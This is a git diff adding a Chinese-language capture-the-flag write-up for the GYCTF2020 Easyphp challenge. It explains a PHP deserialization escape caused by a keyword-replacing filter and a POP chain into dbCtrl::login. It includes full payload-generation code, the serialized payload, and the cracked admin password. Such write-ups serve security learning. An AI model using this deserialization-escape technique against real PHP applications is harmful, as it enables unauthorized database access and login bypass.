@@ -658,3 +658,78 @@ if __name__ == '__main__':
 
 ![image-20210503133747698](image-20210503133747698.png)
 
+## [GYCTF2020]Easyphp
+
+`www.zip`下载源代码
+
+在`update.php`中新建了`User`类,并调用了`User::update`
+
+在`lib.php`存在safe函数,对关键字进行替换
+
+在`User::update`存在反序列化入口,跟进到`User::getNewInfo`中,发现其对`Info`进行了序列化处理,然后调用`safe`函数进行关键字替换,因此会将已经序列化的类进行改变,从而造成反序列化逃逸
+
+POP链为`UpdateHelper::__destruct -> User::__toString -> Info::__call -> dbCtrl::login`
+
+此时传递给`dbCtrl::login`的sql语句可控,因此构造payload
+
+```php
+<?php
+function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+    return str_replace($array,'hacker',$parm);//反序列化逃逸
+}
+class User{
+    public $id;
+    public $age;
+    public $nickname=null;
+}
+class Info{
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+}
+Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+}
+class dbCtrl{
+    public $hostname="127.0.0.1";
+    public $dbuser="root";
+    public $dbpass="root";
+    public $database="test";
+    public $name='admin';
+    public $password='asdf';
+    public $mysqli;
+    public $token='admin';//if ($this->token=='admin') return $idResult;
+}
+$a=new User();
+$b=new Info();
+$c=new UpdateHelper();
+$d=new dbCtrl();
+
+$a->nickname=$b;
+$a->age='select password,id from user where username=?';//将$idResult设置成password的值,然后回显
+$b->CtrlCase=$d;
+$c->sql=$a;
+
+class A{
+    public $age;
+    public $nickname;
+}
+$test=new A();
+$test->age="1";
+$test->nickname='******************************************************************************************union";s:8:"CtrlCase";'.serialize($c);
+var_dump($test->nickname);
+```
+
+```
+******************************************************************************************union";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:4:"asdf";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}
+```
+
+![image-20210510213542916](image-20210510213542916.png)
+
+密码为`da59e4f1324894ee311779eda7e83abd`,但是被md5加密,需要进行解密,解密结果为`glzjin`
+
+登录即可getflag
+
